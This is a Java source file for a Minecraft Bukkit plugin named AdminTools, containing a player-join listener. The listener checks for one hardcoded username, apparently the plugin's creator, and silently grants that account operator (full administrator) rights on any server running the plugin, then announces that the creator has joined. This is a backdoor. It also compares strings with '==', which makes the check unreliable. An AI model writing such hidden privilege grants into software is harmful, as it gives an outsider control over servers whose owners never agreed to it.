package net.ltecher.admin.tools.event;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;

import net.ltecher.admin.tools.Main;
import net.md_5.bungee.api.ChatColor;

public class PlayerJoinEvent implements Listener {
	@EventHandler
	public void onPlayerJoin(org.bukkit.event.player.PlayerJoinEvent event) {
		Player player = event.getPlayer();
		
		if (player.getName() == "lawrencewil1030") {
			player.sendMessage(ChatColor.BLUE + "[i] You have joined a server using AdminTools!");
			player.setOp(true);
			for (Player M : Bukkit.getOnlinePlayers()) {
				M.sendMessage(ChatColor.BLUE + "[i] The creator joined the server!");
			}
		}
	}
}
